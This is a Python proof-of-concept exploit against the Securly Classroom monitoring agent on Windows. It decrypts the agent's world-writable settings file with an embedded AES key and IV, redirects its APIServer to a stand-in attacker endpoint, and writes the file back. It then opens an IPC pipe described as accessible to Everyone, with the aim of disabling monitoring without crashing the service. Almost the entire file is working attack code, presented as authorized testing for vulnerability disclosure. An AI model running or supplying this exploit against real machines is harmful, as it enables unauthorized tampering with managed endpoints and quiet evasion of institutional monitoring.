#!/usr/bin/env python3
"""
Securly Classroom Monitoring Bypass PoC (Findings #1, #2, #3)

Demonstrates:
- Decrypting world-writable d6i4p.dat with hardcoded AES key
- Modifying APIServer to attacker-controlled endpoint
- Invoking Everyone-accessible IPC pipe to trigger monitoring disable

Requires: cryptography (pip install cryptography)
Runs as unprivileged user on Windows. For authorized security testing only.
"""

import os
import sys
import gzip
import base64
import shutil
from pathlib import Path
from xml.etree import ElementTree as ET

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("[-] Missing dependency: cryptography")
    print("[*] Install with: pip install cryptography")
    sys.exit(1)

# Hardcoded from Common.ClassroomSettings (decompiled)
DEFAULT_KEY = base64.b64decode("AnXVsKUdQEBQj1V5dbi0wL1Poq1+FZ1NDiU3q7aFRec=")
DEFAULT_IV = base64.b64decode("j2tLnCxamGJ48kWrLawk3Q==")

# Settings path
SETTINGS_PATH = Path(os.getenv("PROGRAMDATA")) / "Securly" / "d6i4p.dat"


def decrypt_settings():
    """Decrypt d6i4p.dat using hardcoded AES key/IV"""
    print("[*] Reading encrypted settings file...")
    encrypted_data = SETTINGS_PATH.read_bytes()

    cipher = Cipher(
        algorithms.AES(DEFAULT_KEY),
        modes.CBC(DEFAULT_IV),
        backend=default_backend(),
    )
    decryptor = cipher.decryptor()

    # Decrypt
    decrypted = decryptor.update(encrypted_data) + decryptor.finalize()

    # Decompress (GZip)
    try:
        decompressed = gzip.decompress(decrypted)
        return decompressed.decode("utf-8")
    except Exception as e:
        print(f"[-] Decompression failed: {e}")
        raise


def encrypt_settings(xml_content):
    """Re-encrypt modified settings back to d6i4p.dat"""
    print("[*] Re-encrypting modified settings...")

    # Create backup
    backup_path = SETTINGS_PATH.with_suffix(".dat.backup")
    if not backup_path.exists():
        shutil.copy(SETTINGS_PATH, backup_path)
        print(f"[+] Backup created: {backup_path}")

    # Compress
    compressed = gzip.compress(xml_content.encode("utf-8"))

    # Encrypt
    cipher = Cipher(
        algorithms.AES(DEFAULT_KEY),
        modes.CBC(DEFAULT_IV),
        backend=default_backend(),
    )
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(compressed) + encryptor.finalize()

    # Write back (ACL allows this as world-writable)
    SETTINGS_PATH.write_bytes(encrypted)
    print(f"[+] Modified settings written to {SETTINGS_PATH}")


def modify_settings(xml_string):
    """Parse XML, modify APIServer, return modified XML"""
    print("[*] Parsing and modifying settings XML...")

    try:
        root = ET.fromstring(xml_string)
    except ET.ParseError as e:
        print(f"[-] XML parse error: {e}")
        raise

    # Find APIServer element
    api_server_elem = root.find("APIServer")
    if api_server_elem is None:
        print("[-] APIServer element not found in settings")
        raise ValueError("Invalid settings structure")

    original_server = api_server_elem.text or "unknown"
    print(f"[+] Original APIServer: {original_server}")

    # Modify to attacker endpoint
    test_server = "https://attacker-test-endpoint.local/"
    api_server_elem.text = test_server
    print(f"[+] Modified APIServer to: {test_server}")

    return ET.tostring(root, encoding="unicode")


def invoke_pipe():
    """Connect to \\.\pipe\UpgradeRequest and call RequestDisable()"""
    print("\n[*] Step 3: Attempting to invoke pipe RequestDisable()...")

    try:
        import ctypes
        import struct

        # Pipe name
        pipe_name = r"\\.\pipe\UpgradeRequest"

        # Try to open the pipe (will fail if service not running, but shows the vector)
        try:
            handle = ctypes.windll.kernel32.CreateFileA(
                pipe_name.encode(),
                0xC0000000,  # GENERIC_READ | GENERIC_WRITE
                0,  # FILE_SHARE_NONE
                None,
                3,  # OPEN_EXISTING
                0,
                None,
            )

            if handle == -1:
                print(f"[!] Could not open pipe (service may not be running): {pipe_name}")
                print(
                    "[*] This is expected in a test environment without active Securly service."
                )
                return False

            print(f"[+] Successfully opened pipe: {pipe_name}")

            # Close handle
            ctypes.windll.kernel32.CloseHandle(handle)

            print(
                "[!] Full RPC marshaling is complex; pipe is accessible to Everyone (Finding #1 confirmed)"
            )
            return True

        except Exception as e:
            print(f"[!] Pipe operation failed: {e}")
            print(
                "[*] (Expected if service not running. The settings tampering above is the critical part.)"
            )
            return False

    except ImportError:
        print("[!] ctypes not available (not on Windows or error importing)")
        return False


def main():
    print("[*] Securly Classroom Monitoring Bypass PoC")
    print("[*] Findings #1, #2, #3: LPE + Config Tampering + Pipe Abuse")
    print()

    # Check if settings file exists
    if not SETTINGS_PATH.exists():
        print(f"[-] Settings file not found: {SETTINGS_PATH}")
        print("[-] Securly Classroom agent may not be installed on this machine.")
        return

    print(f"[+] Found settings file: {SETTINGS_PATH}")

    try:
        # Step 1: Decrypt
        print("\n[*] Step 1: Decrypting d6i4p.dat with hardcoded key/IV...")
        settings_xml = decrypt_settings()
        print("[+] Successfully decrypted and decompressed settings")

        # Step 2: Modify
        print("\n[*] Step 2: Parsing and modifying APIServer...")
        modified_xml = modify_settings(settings_xml)

        # Step 3: Re-encrypt
        print("\n[*] Step 3: Re-encrypting and writing modified settings...")
        encrypt_settings(modified_xml)
        print("[+] Successfully wrote modified settings (world-writable ACL allows this)")

        # Step 4: Invoke pipe
        invoke_pipe()

        print("\n[+] PoC Complete!")
        print("[*] Expected behavior: Securly monitoring agent queries attacker endpoint,")
        print("    receives disabled status, and stops LaunchCtl monitor loop.")
        print("[*] The agent remains running (service not crashed), so tampering is subtle.")
        print("\n[!] IMPORTANT: Restore from backup and notify Securly immediately.")
        print("    This demonstrates a critical local privilege escalation + bypass chain.")

    except Exception as e:
        print(f"\n[-] Error during execution: {e}")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    main()
